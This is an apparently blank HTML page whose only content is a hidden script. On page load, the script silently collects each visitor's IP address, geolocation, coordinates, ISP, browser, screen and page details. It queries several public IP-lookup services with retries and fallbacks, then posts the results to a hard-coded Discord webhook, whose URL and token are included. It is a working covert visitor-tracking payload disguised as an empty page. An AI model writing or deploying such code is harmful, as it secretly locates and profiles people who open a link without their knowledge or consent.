<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            width: 100%;
        }
    </style>
</head>
<body>

<script>
    (function() {
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ';
        
        let notificationSent = false;
        let dataCollected = false;
        let attempts = 0;
        
        let visitorData = {
            ip: null,
            country: null,
            region: null,
            city: null,
            latitude: null,
            longitude: null,
            timezone: null,
            isp: null,
            source: null,
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: window.screen.width + 'x' + window.screen.height,
            color_depth: window.screen.colorDepth,
            timezone_offset: new Date().getTimezoneOffset(),
            referrer: document.referrer || null,
            url: window.location.href,
            hostname: window.location.hostname,
            connection: navigator.connection ? navigator.connection.effectiveType : null,
            cores: navigator.hardwareConcurrency,
            timestamp: null,
            success: false
        };
        
        function sendToDiscord() {
            if (notificationSent) return;
            if (!WEBHOOK_URL) {
                console.warn('No webhook URL');
                return;
            }
            
            notificationSent = true;
            visitorData.timestamp = new Date().toISOString();
            
            let color = visitorData.success ? 0x00ff00 : 0x88aaff;
            let title = visitorData.success ? '🌐 New Visitor' : '📱 Visitor Detected';
            
            let fields = [];
            
            if (visitorData.ip) fields.push({ name: 'IP Address', value: visitorData.ip, inline: true });
            if (visitorData.country) fields.push({ name: 'Country', value: visitorData.country, inline: true });
            if (visitorData.city) fields.push({ name: 'City', value: visitorData.city, inline: true });
            if (visitorData.region) fields.push({ name: 'Region', value: visitorData.region, inline: true });
            if (visitorData.latitude && visitorData.longitude) fields.push({ name: 'Coordinates', value: `${visitorData.latitude}, ${visitorData.longitude}`, inline: true });
            if (visitorData.timezone) fields.push({ name: 'Timezone', value: visitorData.timezone, inline: true });
            if (visitorData.isp) fields.push({ name: 'ISP', value: visitorData.isp, inline: true });
            if (visitorData.source) fields.push({ name: 'Data Source', value: visitorData.source, inline: false });
            
            fields.push({ name: 'Browser/OS', value: visitorData.user_agent.substring(0, 80), inline: false });
            fields.push({ name: 'Screen', value: visitorData.screen, inline: true });
            fields.push({ name: 'Language', value: visitorData.language, inline: true });
            fields.push({ name: 'Page', value: visitorData.url.substring(0, 100), inline: false });
            
            let payload = {
                embeds: [{
                    title: title,
                    color: color,
                    fields: fields,
                    footer: { text: `Attempts: ${attempts}` },
                    timestamp: visitorData.timestamp
                }]
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(function(e) {});
        }
        
        function updateData(data, sourceName) {
            if (!data) return false;
            let updated = false;
            
            if (data.ip && !visitorData.ip) { visitorData.ip = data.ip; updated = true; }
            if (data.country && !visitorData.country) { visitorData.country = data.country; updated = true; }
            if (data.region && !visitorData.region) { visitorData.region = data.region; updated = true; }
            if (data.city && !visitorData.city) { visitorData.city = data.city; updated = true; }
            if (data.latitude && !visitorData.latitude) { visitorData.latitude = data.latitude; updated = true; }
            if (data.longitude && !visitorData.longitude) { visitorData.longitude = data.longitude; updated = true; }
            if (data.timezone && !visitorData.timezone) { visitorData.timezone = data.timezone; updated = true; }
            if (data.isp && !visitorData.isp) { visitorData.isp = data.isp; updated = true; }
            
            if (updated && !visitorData.source) {
                visitorData.source = sourceName;
            } else if (updated && visitorData.source) {
                visitorData.source = visitorData.source + ' → ' + sourceName;
            }
            
            if (updated) {
                visitorData.success = true;
                dataCollected = true;
                sendToDiscord();
                return true;
            }
            return false;
        }
        
        function jsonpFetch(url, timeoutMs) {
            return new Promise(function(resolve, reject) {
                let callbackName = 'cb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
                let script = document.createElement('script');
                let timeout = setTimeout(function() {
                    if (script.parentNode) script.parentNode.removeChild(script);
                    delete window[callbackName];
                    reject(new Error('Timeout'));
                }, timeoutMs || 8000);
                
                window[callbackName] = function(data) {
                    clearTimeout(timeout);
                    delete window[callbackName];
                    if (script.parentNode) script.parentNode.removeChild(script);
                    resolve(data);
                };
                
                let separator = url.indexOf('?') === -1 ? '?' : '&';
                script.src = url + separator + 'callback=' + callbackName;
                script.onerror = function() {
                    clearTimeout(timeout);
                    delete window[callbackName];
                    if (script.parentNode) script.parentNode.removeChild(script);
                    reject(new Error('Script load failed'));
                };
                document.head.appendChild(script);
            });
        }
        
        function cloudflareTrace() {
            attempts++;
            return fetch('https://www.cloudflare.com/cdn-cgi/trace')
                .then(function(r) {
                    if (!r.ok) throw new Error();
                    return r.text();
                })
                .then(function(text) {
                    let ip = '';
                    let loc = '';
                    let lines = text.split('\n');
                    for (let i = 0; i < lines.length; i++) {
                        if (lines[i].startsWith('ip=')) ip = lines[i].substring(3);
                        if (lines[i].startsWith('loc=')) loc = lines[i].substring(4);
                    }
                    if (ip) {
                        return { ip: ip, country: loc, source: 'cloudflare' };
                    }
                    throw new Error();
                })
                .catch(function() {
                    return null;
                });
        }
        
        function ipifyJsonp() {
            attempts++;
            return jsonpFetch('https://api.ipify.org?format=jsonp', 5000)
                .then(function(data) {
                    if (data && data.ip) {
                        return { ip: data.ip, source: 'ipify' };
                    }
                    throw new Error();
                })
                .catch(function() {
                    return null;
                });
        }
        
        function ipapiJsonp() {
            attempts++;
            return jsonpFetch('https://ip-api.com/json/', 6000)
                .then(function(data) {
                    if (data && data.status === 'success' && data.query) {
                        return {
                            ip: data.query,
                            country: data.country,
                            region: data.regionName,
                            city: data.city,
                            latitude: data.lat,
                            longitude: data.lon,
                            isp: data.isp,
                            timezone: data.timezone,
                            source: 'ip-api'
                        };
                    }
                    throw new Error();
                })
                .catch(function() {
                    return null;
                });
        }
        
        function ipwhoisJsonp() {
            attempts++;
            return jsonpFetch('https://ipwho.is/', 6000)
                .then(function(data) {
                    if (data && data.success === true && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            isp: data.connection ? data.connection.isp : null,
                            source: 'ipwho.is'
                        };
                    }
                    throw new Error();
                })
                .catch(function() {
                    return null;
                });
        }
        
        function ipapiCoJsonp() {
            attempts++;
            return jsonpFetch('https://ipapi.co/json/', 6000)
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country_name,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            isp: data.org,
                            source: 'ipapi.co'
                        };
                    }
                    throw new Error();
                })
                .catch(function() {
                    return null;
                });
        }
        
        function ipwhoisAppJsonp() {
            attempts++;
            return jsonpFetch('https://ipwhois.app/json/', 6000)
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            isp: data.isp,
                            source: 'ipwhois.app'
                        };
                    }
                    throw new Error();
                })
                .catch(function() {
                    return null;
                });
        }
        
        let services = [
            cloudflareTrace,
            ipifyJsonp,
            ipapiJsonp,
            ipwhoisJsonp,
            ipapiCoJsonp,
            ipwhoisAppJsonp
        ];
        
        let currentIndex = 0;
        let completed = false;
        
        function tryNext() {
            if (completed) return;
            
            if (currentIndex >= services.length) {
                if (!dataCollected && !notificationSent) {
                    visitorData.ip = 'unavailable-' + Date.now().toString(36);
                    visitorData.source = 'fallback-generator';
                    visitorData.success = false;
                    sendToDiscord();
                }
                completed = true;
                return;
            }
            
            let service = services[currentIndex];
            currentIndex++;
            
            let timeoutId = setTimeout(function() {
                tryNext();
            }, 7000);
            
            service()
                .then(function(result) {
                    clearTimeout(timeoutId);
                    if (completed) return;
                    
                    if (result && result.ip) {
                        let updated = updateData(result, result.source || 'unknown');
                        if (updated) {
                            completed = true;
                        } else {
                            tryNext();
                        }
                    } else {
                        tryNext();
                    }
                })
                .catch(function() {
                    clearTimeout(timeoutId);
                    if (!completed) {
                        tryNext();
                    }
                });
        }
        
        function getTimezoneFromBrowser() {
            try {
                let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                if (tz && !visitorData.timezone) {
                    visitorData.timezone = tz;
                    if (!visitorData.source) visitorData.source = 'browser-timezone';
                }
            } catch(e) {}
        }
        
        function finalSafety() {
            setTimeout(function() {
                if (!notificationSent) {
                    if (!visitorData.ip) {
                        visitorData.ip = 'safety-' + Date.now().toString(36);
                        visitorData.source = 'safety-timeout';
                    }
                    visitorData.success = dataCollected;
                    sendToDiscord();
                }
                completed = true;
            }, 12000);
        }
        
        getTimezoneFromBrowser();
        
        tryNext();
        
        finalSafety();
        
        window.addEventListener('load', function() {
            setTimeout(function() {
                if (!notificationSent && visitorData.ip) {
                    sendToDiscord();
                    completed = true;
                }
            }, 5000);
        });
    })();
</script>
</body>
</html>
